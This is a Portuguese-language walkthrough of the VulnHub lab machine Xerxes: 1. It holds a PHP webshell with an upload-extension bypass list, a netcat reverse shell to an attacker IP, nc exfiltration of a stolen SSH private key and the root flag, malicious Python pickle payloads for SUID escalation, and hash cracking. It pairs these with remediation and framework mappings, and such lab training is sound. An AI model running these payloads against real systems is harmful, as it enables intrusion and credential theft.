# Xerxes: 1 — Isso Não é Esparta, Mas as Defesas do Rei São Igualmente Arrogantes

Bora rapaziada!! Xerxes: 1 tem o nome do rei persa que invadiu a Grécia com força avassaladora mas perdeu para metodologia disciplinada. A máquina espelha o tema: ela joga camadas de esteganografia, codificação e ofuscação em você, mas enumeração metódica e paciente derrota cada defesa. Decodificação de stego multicamadas desbloqueia um upload de arquivo, cadeia de movimento lateral por três usuários revela credenciais escondidas em histórico bash e strings de binário, e um binário SUID com desserialização Python pickle leva a grupos elevados antes que uma senha sudo derivada de timestamp te entregue o root. Máquina absurda. Desafio de alto nível. Top demais pra quem quer entender exploração multi-estágio de verdade.

| Campo | Valor |
|---|---|
| **Nível** | Difícil |
| **VM Alvo** | Xerxes: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/xerxes-1,58/ |
| **Técnicas** | Nmap, dirb, decodificação QR, esteganografia (extração canal alfa), codificação multicamada (Base64/decimal/ASCII/Brainfuck), bypass extensão upload (.pht), webshell PHP, reverse shell, coleta de credenciais do histórico bash, enumeração SUID, deserialização pickle Python, reutilização chave SSH, quebra de senha derivada de timestamp |
| **CVEs** | CWE-434 (bypass extensão upload), CWE-502 (deserialização pickle insegura), CWE-522 (credenciais no histórico bash), CWE-321 (senha derivada de timestamp), CWE-312 (chave SSH privada exposta em diretório compartilhado) |
| **Grupos APT** | APT28: usa esteganografia multicamada para C2; Lazarus Group: ataques pickle contra ferramentas Python internas |

---

## Resumo do Ataque

```
nmap → HTTP 80
  → dirb → /dev (página recuperar senha + QR code)
  → zbarimg → Base64 decode → dica: "olhe mais fundo"
  → GIMP: decompor canal alfa → sequência decimal → chr() → string ASCII
  → Base64 decode → código Brainfuck → executar online → senha: VonBraun
  → formulário upload /dev (senha: VonBraun) → shell.pht bypass → webshell
  → shell.pht?cmd=nc → reverse shell (www-data)
  → cat /home/amanpour/.bash_history → steqr.py -f newpassword → creds amanpour
  → ssh amanpour → amanpour no grupo curtiz
  → /home/curtiz/: notes + /bin/delacroix → strings → hash MD5 → quebrar → VonBraun
  → cp /home/curtiz/id_rsa → ssh -i id_rsa delacroix
  → find SUID → /opt/notes (pickle.load em arquivo do usuário)
  → payload pickle malicioso → shell elevado
  → /home/delacroix/generate.sh → stat .last → hora de criação → md5sum → senha sudo
  → sudo bash → root
  → /root/flag (arquivo de imagem PNG)
```

---

## Metodologia

1. Scan completo de portas e enumeração de diretórios
2. Decodificação de QR code na página `/dev`
3. Extração do canal alfa no GIMP
4. Cadeia de decodificação multicamada: decimal para ASCII para Base64 para Brainfuck
5. Bypass de upload com extensão `.pht`
6. Webshell para reverse shell
7. Coleta de credenciais do histórico bash para movimento lateral para `amanpour`
8. Acesso baseado em grupo: `amanpour` lê diretório home de `curtiz`
9. Quebrar hash MD5 do binário, obter chave SSH para `delacroix`
10. Binário SUID: explorar deserialização Python pickle
11. Senha sudo derivada de timestamp: decodificar do tempo de criação do arquivo
12. Root via sudo, recuperar PNG da flag

---

## Passo 1 — Reconhecimento e Enumeração de Diretórios

```bash
sudo netdiscover
# Alvo: 192.168.1.ALVO

nmap -A 192.168.1.ALVO
# Porta 80: HTTP apenas

dirb http://192.168.1.ALVO
```

`dirb` descobre `/dev/`: uma página de recuperação de senha com um QR code embutido. Este é o ponto de entrada para toda a cadeia de esteganografia.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 2 — Decodificação QR e Esteganografia do Canal Alfa

### 2a. Download e decode do QR code

```bash
wget http://192.168.1.ALVO/dev/[imagem_qrcode]
zbarimg [qrcode].png
echo "[BASE64_DO_QR]" | base64 -d
# Saída: dica para olhar no canal alfa da imagem
```

### 2b. Extrair canal alfa com GIMP

1. Abrir a imagem no GIMP: **Arquivo → Abrir**
2. Decompor alfa: **Cores → Componentes → Decompor → Selecionar "Alpha"**
3. Usar a ferramenta Color Picker nos pixels fracos no canto superior esquerdo da camada alfa decomposta
4. Registrar os valores alfa como inteiros decimais

### 2c. Converter sequência decimal para ASCII

```bash
python3 -c "print(''.join([chr(x) for x in [72, 101, 108, ...]]))"
```

A saída ASCII é outra string Base64.

### 2d. Base64 revela Brainfuck

```bash
echo "[STRING_BASE64]" | base64 -d
# Saída: código Brainfuck

# Executar online em: https://copy.sh/brainfuck/
# Resultado: VonBraun
```

**Senha:** `VonBraun`

**Nota real:** Cadeias de codificação multicamada são usadas por atores avançados para esconder comunicação C2 e dados exfiltrados dentro de arquivos de imagem. APT28 foi documentado usando técnicas esteganográficas para ocultar dados em canais alfa JPEG durante operações de persistência de longo prazo.

**MITRE ATT&CK:** T1027.003 — Arquivos Ofuscados: Esteganografia

---

## Passo 3 — Bypass de Upload de Arquivo com Extensão .pht

O formulário em `/dev` aceita uploads após inserir a senha `VonBraun`. Criar uma webshell PHP:

```php
<?php system($_GET['cmd']); ?>
```

Salvar como `shell.pht`. O filtro de upload bloqueia `.php` mas não `.pht`. Apache trata `.pht` como PHP e executa:

```bash
curl "http://192.168.1.ALVO/dev/upload/shell.pht?cmd=id"
# Saída: uid=33(www-data)
```

**Lista de extensões alternativas para bypass:**

```
.php .php3 .php4 .php5 .php7 .phtml .pht .phps .shtml
```

**Nota real:** Validação apenas por extensão de arquivo é trivialmente contornada. A validação correta requer verificar tipo MIME, magic bytes (primeiros 4-8 bytes do arquivo) e restringir permissões de execução no diretório de upload.

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública

---

## Passo 4 — Reverse Shell a partir da Webshell

```bash
# Atacante: iniciar listener
nc -lvnp 1234

# Disparar via webshell:
curl "http://192.168.1.ALVO/dev/upload/shell.pht?cmd=nc+-e+/bin/bash+192.168.1.ATACANTE+1234"
```

Estabilizar o shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z no atacante, depois: stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Shell Unix

---

## Passo 5 — Movimento Lateral para amanpour via Histórico Bash

```bash
ls /home
# amanpour  curtiz  delacroix
cat /home/amanpour/.bash_history
# python steqr.py -f newpassword
ssh amanpour@192.168.1.ALVO
# Senha: newpassword
```

**Nota real:** Coleta do histórico bash é o primeiro passo de pós-exploração em qualquer host Linux para testadores e atores de ameaça experientes. Comandos sensíveis devem ser prefixados com espaço (evita registro se `HISTCONTROL=ignorespace` estiver configurado), ou `HISTFILE=/dev/null` deve ser definido antes de rodar comandos sensíveis.

**MITRE ATT&CK:** T1552.003 — Credenciais Sem Proteção: Histórico Bash

---

## Passo 6 — Movimento Lateral para delacroix via Acesso de Grupo e Chave SSH

```bash
id
# uid=1001(amanpour) gid=1001(amanpour) groups=1001(amanpour),1003(curtiz)

ls -la /home/curtiz/
cat /home/curtiz/notes
strings /bin/delacroix
# Revela hash MD5
```

Quebrar o hash:

```bash
echo "[HASH_MD5]" | hashcat -m 0 - /usr/share/wordlists/rockyou.txt
# Resultado: VonBraun
```

SSH com senha pode falhar para `delacroix`. Usar a chave SSH encontrada em `/home/curtiz/`:

```bash
cp /home/curtiz/id_rsa /tmp/
chmod 600 /tmp/id_rsa
# Transferir para atacante:
nc 192.168.1.ATACANTE 5556 < /tmp/id_rsa    # alvo
nc -lvnp 5556 > delacroix_id_rsa             # atacante
chmod 600 delacroix_id_rsa
ssh -i delacroix_id_rsa delacroix@192.168.1.ALVO
```

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1552.004 — Chaves Privadas Sem Proteção

---

## Passo 7 — Binário SUID: Deserialização pickle Python

Como `delacroix`, enumerar binários SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
# /opt/notes

cat /opt/notes.py
# Usa pickle.load() em caminho de arquivo fornecido pelo usuário
```

Criar payload pickle malicioso:

```bash
cat > /tmp/evil_pickle << 'EOF'
cos
system
(S'/bin/sh'
tR.
EOF

/opt/notes
load ../../tmp/evil_pickle
```

**Método Python:**

```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

with open('/tmp/exploit.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```

```bash
/opt/notes
load ../../tmp/exploit.pkl
```

**Nota real:** Vulnerabilidades de deserialização pickle Python causaram incidentes reais significativos: CVE-2019-11248 (Kubernetes), múltiplos frameworks de pipeline ML (MLflow, carregamento de modelos HuggingFace) foram explorados via payloads pickle maliciosos. NUNCA deserialize dados pickle de fontes não confiáveis.

**MITRE ATT&CK:** T1068 — Exploração para Escalação de Privilégios

---

## Passo 8 — Senha Sudo Derivada de Timestamp para Root

```bash
cat /home/delacroix/generate.sh
stat .last
# Hora de criação, ex.: 00:19:51

CREATION_TIME="00:19:51"
echo -n "$CREATION_TIME" | md5sum
# Este é o hash = a senha sudo

sudo bash
# Senha: [MD5_DA_HORA_DE_CRIAÇÃO]
id
# uid=0(root)
```

Recuperar a flag root (arquivo PNG):

```bash
file /root/flag
# Dados de imagem PNG

# Transferir para atacante:
nc -lvnp 5555 > flag.png      # atacante
nc 192.168.1.ATACANTE 5555 < /root/flag  # alvo
```

Abrir `flag.png` na máquina atacante para ver a flag final.

(☞ﾟヮﾟ)☞ Root. Isso não é Esparta! Na verdade, é root. Mesma energia.

**MITRE ATT&CK:** T1548.003 — Mecanismo de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Observações |
|---|---|---|---|
| Senha stego | VonBraun | Cadeia canal alfa → decode Brainfuck | Senha formulário de upload |
| Senha amanpour | newpassword | /home/amanpour/.bash_history | Exposta como argumento de comando |
| Hash MD5 curtiz | (de /bin/delacroix) | strings no binário | Quebra para: VonBraun |
| Chave SSH delacroix | (chave privada) | /home/curtiz/id_rsa | Acesso baseado em grupo |
| Senha sudo | md5sum do tempo de criação de .last | generate.sh + stat | Derivada de timestamp |
| Flag root | (imagem PNG) | /root/flag | Transferir via nc |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Esteganografia multicamada ocultando credenciais no canal alfa | APT28 usa canais esteganográficos em arquivos de imagem para C2 e exfiltração | Monitorar tamanhos/metadados incomuns de arquivos de imagem; usar ferramentas de análise estego no threat hunting |
| 2 | Bypass de upload com extensão .pht | Filtragem apenas por extensão é trivialmente contornada; dezenas de CVEs de CMS exploram isso | Validar por tipo MIME E magic bytes E extensão; desabilitar execução PHP em diretórios de upload |
| 3 | Credenciais no histórico bash | Histórico bash é a primeira leitura de atacantes pós-comprometimento; comandos sensíveis no histórico habilitam movimento lateral | Usar `HISTFILE=/dev/null` para sessões sensíveis; limpar histórico após operações com credenciais |
| 4 | Chave SSH privada armazenada em diretório legível pelo grupo | Exposição de chave SSH cross-user habilita movimento lateral sem quebra de senha | Permissões `600` em todas as chaves privadas; nunca armazenar em diretórios acessíveis a outros usuários |
| 5 | Deserialização pickle Python RCE | Pickle é formato de serialização inseguro conhecido; numerosos exploits reais usam payloads pickle | Substituir pickle por JSON ou MessagePack; nunca deserializar dados não confiáveis |
| 6 | Senha sudo derivada de timestamp | Usar metadados do sistema previsíveis e determinísticos para derivar credenciais é criptograficamente quebrado | Gerar senhas sudo com CSPRNG; nunca derivar credenciais de estado observável do sistema |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Evasão de Defesa | Evasão | Arquivos Ofuscados: Esteganografia | T1027.003 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
| Execução | Execução | Shell Unix | T1059.004 |
| Acesso a Credenciais | Acesso a Credenciais | Histórico Bash | T1552.003 |
| Acesso a Credenciais | Acesso a Credenciais | Chaves Privadas | T1552.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |
| Escalação de Privilégios | Escalação de Privilégios | Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. Corrigir validação de upload: validar tipo MIME, magic bytes E extensão; desabilitar PHP em diretórios de upload
2. Hardening do histórico bash: `HISTFILE=/dev/null` para sessões privilegiadas; `HISTCONTROL=ignorespace`; rotacionar credenciais após exposição via linha de comando
3. Segurança de chaves SSH: permissões `600` em todas as chaves privadas; nunca armazenar em diretórios acessíveis a outros grupos
4. Substituir pickle por serialização segura: JSON, MessagePack ou protobuf; validação de entrada antes de qualquer deserialização
5. Gerar credenciais criptograficamente aleatórias: nunca derivar senhas de estado previsível do sistema
6. Remover SUID de scripts Python personalizados: SUID em interpretadores Python que usam pickle é inerentemente perigoso

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os binários SUID; identificar scripts Python com SUID |
| Proteger | Controle de Acesso | Corrigir permissões de chave SSH; restringir diretórios sensíveis legíveis por grupo |
| Proteger | Segurança de Dados | Segurança do histórico bash; substituir pickle por serialização segura |
| Detectar | Anomalias e Eventos | Alertar em execução de binários SUID; monitorar uso de ferramentas de análise estego |
| Responder | Planejamento de Resposta | Rotacionar todas as credenciais expostas no histórico bash ou via cadeia stego |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Corrigir diretório SSH legível pelo grupo; restringir acesso ao binário SUID |
| AC-6 | Menor Privilégio | Remover SUID de scripts Python; restringir sudo |
| IA-5 | Gestão de Autenticadores | Usar CSPRNG para credenciais; nunca derivar de estado previsível do sistema |
| CM-7 | Menor Funcionalidade | Desabilitar PHP em diretórios de upload; remover SUID de binários não-essenciais |

### CISA KEV

O padrão de deserialização pickle Python mapeia para descobertas CWE-502 documentadas em múltiplos advisories CISA. Bypasses de extensão de upload de arquivo são cobertos no advisory CISA AA21-008A sobre técnicas de implantação de webshell.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Contas Privilegiadas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Consciência Situacional (SA) | Monitorar Logs e Eventos | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (restrições de upload; substituição de pickle)
- **D3-OAM** — Gestão Administrativa do SO (auditoria SUID; higiene do histórico bash)
- **D3-DNAA** — Análise de Acesso a Nó de Dados (esteganálise para detecção de exfiltração)

---

## Considerações Finais

Xerxes: 1 é uma das máquinas CTF mais criativas do VulnHub. A cadeia de esteganografia é genuinamente avançada: extração de pixels do canal alfa, decimal para ASCII, Base64, Brainfuck. A cadeia de movimento lateral por três usuários é metódica e ensina a disciplina de ler tudo, não apenas rodar ferramentas automatizadas. A deserialização pickle e a senha derivada de timestamp são técnicas inteligentes e relevantes no mundo real.

O rei Xerxes foi derrotado não por falta de recursos, mas por subestimar o defensor metódico. Esta máquina ensina o inverso: enumeração metódica derrota cada camada de ofuscação, não importa quão criativa.

Thanks guys!! (❍ᴥ❍ʋ)
